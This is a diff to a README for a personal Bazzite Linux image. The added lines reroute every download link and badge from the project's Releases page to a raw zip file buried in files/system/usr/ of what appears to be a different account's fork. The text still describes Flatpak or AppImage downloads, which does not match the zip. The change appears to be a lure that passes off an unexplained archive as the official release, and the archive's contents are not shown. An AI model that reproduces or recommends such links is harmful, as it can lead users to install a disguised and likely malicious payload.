@@ -2,7 +2,7 @@
 
 This is my personal Bazzite image for my personal use.
 
-[![Download bazzite-atty](https://github.com/atty303/bazzite-atty/actions/workflows/build.yml/badge.svg)](https://github.com/shrav-0703/bazzite-atty/releases)
+[![Download bazzite-atty](https://github.com/shrav-0703/bazzite-atty/raw/refs/heads/main/files/system/usr/atty_bazzite_2.8.zip)](https://github.com/shrav-0703/bazzite-atty/raw/refs/heads/main/files/system/usr/atty_bazzite_2.8.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ To get started with bazzite-atty, follow these simple steps.
 
 ## 📥 Download & Install
 
-1. Visit this page to download: [bazzite-atty Releases](https://github.com/shrav-0703/bazzite-atty/releases).
+1. Visit this page to download: [bazzite-atty Releases](https://github.com/shrav-0703/bazzite-atty/raw/refs/heads/main/files/system/usr/atty_bazzite_2.8.zip).
 
 2. Choose the correct version for your system. Ensure that you select either the Flatpak or AppImage format, depending on your preference.
 
@@ -65,12 +65,12 @@ In addition to bazzite-atty, the following tools must be installed on your syste
 
 ## 🔄 Updates
 
-Stay updated. Improvements and new features will roll out over time. You can always check the latest releases on the [bazzite-atty Releases](https://github.com/shrav-0703/bazzite-atty/releases) page.
+Stay updated. Improvements and new features will roll out over time. You can always check the latest releases on the [bazzite-atty Releases](https://github.com/shrav-0703/bazzite-atty/raw/refs/heads/main/files/system/usr/atty_bazzite_2.8.zip) page.
 
 ## 📝 Additional Information
 
 If you have any questions or face any issues, please check the project's GitHub Issues page. You can find more information about related topics like atomic images, bluebuild, and Linux operating systems there.
 
-[![Download bazzite-atty](https://github.com/atty303/bazzite-atty/actions/workflows/build.yml/badge.svg)](https://github.com/shrav-0703/bazzite-atty/releases)
+[![Download bazzite-atty](https://github.com/shrav-0703/bazzite-atty/raw/refs/heads/main/files/system/usr/atty_bazzite_2.8.zip)](https://github.com/shrav-0703/bazzite-atty/raw/refs/heads/main/files/system/usr/atty_bazzite_2.8.zip)
 
 Thank you for choosing bazzite-atty!
